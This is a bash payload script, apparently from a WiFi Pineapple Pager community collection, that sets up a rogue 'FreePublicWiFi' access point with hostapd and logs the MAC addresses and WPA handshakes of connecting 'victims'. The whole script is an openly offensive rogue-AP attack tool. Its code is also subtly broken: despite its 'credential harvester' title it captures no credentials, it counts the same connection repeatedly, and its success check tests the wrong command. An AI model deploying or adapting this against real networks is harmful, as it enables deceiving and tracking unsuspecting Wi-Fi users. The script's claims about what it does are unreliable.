#!/bin/bash
# Title: Network Credential Harvester
# Description: Creates a rogue AP to harvest network credentials from connecting devices
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: Exfiltration
# Net Mode: NAT
#
# LED State Descriptions
# Magenta Solid - Configuring rogue AP
# Amber Blink - Waiting for connections
# Green Blink - Credential captured
# Red Blink - Error occurred

# Configuration Options
ROGUE_SSID="FreePublicWiFi"
ROGUE_CHANNEL="6"
CAPTURE_LOG="/tmp/captured_credentials.log"
MAX_CAPTURE_TIME=300  # 5 minutes

# Initialize log file
touch "$CAPTURE_LOG"
LOG "Starting Network Credential Harvester"
LOG "Target SSID: $ROGUE_SSID"
LOG "Channel: $ROGUE_CHANNEL"

# Confirm with user
CONFIRMATION=$(CONFIRMATION_DIALOG "Launch credential harvester on channel $ROGUE_CHANNEL?")
case $? in
    $DUCKYSCRIPT_REJECTED)
        LOG "User rejected operation"
        exit 1
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG "Dialog error occurred"
        exit 1
        ;;
esac

case "$CONFIRMATION" in
    $DUCKYSCRIPT_USER_DENIED)
        LOG "User denied operation"
        exit 0
        ;;
esac

LOG "User confirmed - starting harvester"

# Start spinner
spinner_id=$(START_SPINNER "Configuring rogue AP...")

# Configure the rogue AP using hostapd
cat > /tmp/harvester_hostapd.conf <<EOF
interface=wlan0
driver=nl80211
ssid=$ROGUE_SSID
hw_mode=g
channel=$ROGUE_CHANNEL
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
logger_stdout=-1
logger_stdout_level=2
EOF

# Start hostapd in background
hostapd /tmp/harvester_hostapd.conf -B > /tmp/hostapd.log 2>&1

STOP_SPINNER $spinner_id

if [ $? -eq 0 ]; then
    LOG "Rogue AP started successfully"
    ALERT "Harvester Active: $ROGUE_SSID"
else
    LOG "Failed to start rogue AP"
    ERROR_DIALOG "Failed to start rogue AP"
    exit 1
fi

# Monitor for connections and capture attempts
LOG "Monitoring for connections..."
spinner_id=$(START_SPINNER "Waiting for victims...")

start_time=$(date +%s)
captured_count=0

while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))
    
    # Check if max time exceeded
    if [ $elapsed -gt $MAX_CAPTURE_TIME ]; then
        LOG "Max capture time reached"
        break
    fi
    
    # Monitor hostapd log for connection attempts
    if grep -q "AP-STA-CONNECTED" /tmp/hostapd.log; then
        # Extract MAC address of connected client
        mac=$(grep "AP-STA-CONNECTED" /tmp/hostapd.log | tail -1 | awk '{print $3}')
        LOG "Client connected: $mac"
        echo "$(date): Client $mac connected to rogue AP" >> "$CAPTURE_LOG"
        captured_count=$((captured_count + 1))
        ALERT "Victim connected: $mac"
    fi
    
    # Check for authentication attempts
    if grep -q "WPA: pairwise key handshake completed" /tmp/hostapd.log; then
        LOG "Handshake captured!"
        echo "$(date): WPA handshake captured" >> "$CAPTURE_LOG"
        ALERT "Handshake captured!"
    fi
    
    sleep 5
done

STOP_SPINNER $spinner_id

# Cleanup
LOG "Stopping rogue AP..."
killall hostapd 2>/dev/null
rm -f /tmp/harvester_hostapd.conf

# Display results
LOG "Harvesting complete"
LOG "Total victims: $captured_count"
LOG "Results saved to: $CAPTURE_LOG"

if [ $captured_count -gt 0 ]; then
    ALERT "Captured $captured_count victims!"
else
    ALERT "No victims captured"
fi

LOG "Credential harvester finished"
